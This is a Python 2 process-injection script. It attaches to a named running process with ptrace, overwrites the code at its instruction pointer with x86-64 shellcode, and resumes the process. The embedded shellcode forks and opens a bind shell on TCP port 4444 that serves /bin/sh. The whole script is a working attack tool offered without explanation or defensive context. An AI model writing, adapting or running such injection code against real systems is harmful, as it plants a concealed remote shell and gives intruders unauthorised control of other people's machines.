#!/usr/bin/python2
import commands
from ptrace.debugger.debugger import PtraceDebugger
from ptrace.debugger.debugger import PtraceProcess
import sys

cyan = "\x1b[1;36m"
clear = "\x1b[0m"
procname = "test" # XXX: FOR TESTING

def getpid(procname):
    pid = commands.getoutput("pidof %s" %(procname))
    return pid

def attach(pid):
    print "%s{+} Attaching to %s %s" %(cyan, pid, clear)
    dbg = PtraceDebugger()
    process = dbg.addProcess(int(pid), False)
    return process

buf =  ""
buf += "\x6a\x39\x58\x0f\x05\x48\x85\xc0\x74\x08\x48\x31\xff"
buf += "\x6a\x3c\x58\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a"
buf += "\x01\x5e\x0f\x05\x48\x97\x52\xc7\x04\x24\x02\x00\x11"
buf += "\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x6a"
buf += "\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f\x05\x48"
buf += "\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += "\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73"
buf += "\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"

def inject(process, shellcode):
    rip = process.getInstrPointer()
    print "%s{*} RIP: %s %s" %(cyan, rip, clear)
    print "%s{*} Insert Shellcodez...%s" %(cyan, clear)
    bytes = process.writeBytes(rip, shellcode)
    print "%s{*} Setting rbx to 0...%s" %(cyan, clear)
    process.setreg("rbx", 0)
    print "%s{*} Carry on camping...%s" %(cyan, clear)
    process.cont()
    # we should restore the registers here... Need to test this!
    sys.exit(0)

def main():
    inject(attach(getpid(procname)), shellcode=buf)

if __name__ == "__main__":
    main()

